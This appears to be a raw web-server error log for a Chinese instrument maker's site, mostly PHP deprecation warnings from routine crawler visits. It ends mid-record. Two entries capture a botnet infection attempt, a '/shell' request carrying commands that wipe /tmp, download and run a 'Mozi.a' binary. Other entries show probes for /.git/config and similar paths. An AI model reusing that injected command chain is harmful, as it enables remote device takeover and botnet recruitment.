[ 2026-03-18T09:14:01+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:14:01+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:14:02+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:14:02+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:14:02+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:14:02+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:14:03+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:14:03+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:14:03+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:14:03+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:14:04+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:14:04+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:26:02+08:00 ] 162.142.125.209 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:26:04+08:00 ] 162.142.125.209 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T09:26:04+08:00 ] 162.142.125.209 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T09:26:08+08:00 ] 162.142.125.209 GET 120.24.147.77/.well-known/security.txt
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T09:26:50+08:00 ] 52.167.144.217 GET www.punalei.cn/ldcms/dianzifuzaixilie.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T09:28:52+08:00 ] 123.191.143.229 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:29:39+08:00 ] 27.43.206.164 GET 120.24.147.77/shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T09:29:39+08:00 ] 27.43.206.164 GET 120.24.147.77/shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T09:29:48+08:00 ] 35.233.42.65 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:30:38+08:00 ] 27.21.28.16 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:30:38+08:00 ] 27.21.28.16 GET www.punalei.cn/ldcms/lianxiwomen.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T09:30:38+08:00 ] 27.21.28.16 GET www.punalei.cn/lianxiwomen.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T09:30:38+08:00 ] 27.21.28.16 GET www.punalei.cn/lianxiwomen.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T09:43:35+08:00 ] 40.77.167.126 GET www.punalei.cn/ldcms/punaleiPNAIduogongnenganguixilie/309.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T09:47:27+08:00 ] 152.136.153.69 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:53:47+08:00 ] 149.86.227.60 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T10:01:44+08:00 ] 198.235.24.112 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T10:31:24+08:00 ] 64.62.197.167 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T10:38:14+08:00 ] 64.62.197.174 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T10:40:54+08:00 ] 216.73.216.143 GET www.punalei.cn/sitemap.xml
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T10:40:54+08:00 ] 216.73.216.143 GET www.punalei.cn/sitemap.xml
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T10:41:36+08:00 ] 64.62.197.167 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T10:41:36+08:00 ] 64.62.197.167 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T10:46:01+08:00 ] 204.76.203.18 GET 120.24.147.77/bin/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T10:46:01+08:00 ] 204.76.203.18 GET 120.24.147.77/bin/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T10:52:48+08:00 ] 64.62.197.167 GET 120.24.147.77/geoserver/web/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T10:52:48+08:00 ] 64.62.197.167 GET 120.24.147.77/geoserver/web/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T10:56:56+08:00 ] 64.62.197.167 GET 120.24.147.77/.git/config
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T10:58:08+08:00 ] 40.77.167.43 GET www.punalei.cn/ldcms/ceshi/299.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T11:05:20+08:00 ] 35.203.210.192 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T11:19:54+08:00 ] 40.77.167.156 GET www.punalei.cn/ldcms/zhiliudianzuceshiyiPNL2511xilie/320.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T11:21:33+08:00 ] 40.77.167.67 GET www.punalei.cn/ldcms/xiazaizhongxin.html?type=5&name=%E5%BA%94%E7%94%A8%E4%BA%A7%E5%93%81%E8%B5%84%E6%96%99
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ download ] 5
---------------------------------------------------------------
[ 2026-03-18T11:21:33+08:00 ] 40.77.167.67 GET www.punalei.cn/ldcms/xiazaizhongxin.html?type=5&name=%E5%BA%94%E7%94%A8%E4%BA%A7%E5%93%81%E8%B5%84%E6%96%99
[ download ] [{"id":242,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20\\30\\45\\60-\\TSS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":244,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\60-\\GSD\\GSS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":260,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9505\\10-\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":262,"title":"\u5355\u76f8\u578bPNL300-A\u4ea4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20260309\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":263,"title":"\u6cc4\u6f0f\u7535\u6d41\u6d4b\u8bd5\u4eeaPNL2675\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":264,"title":" 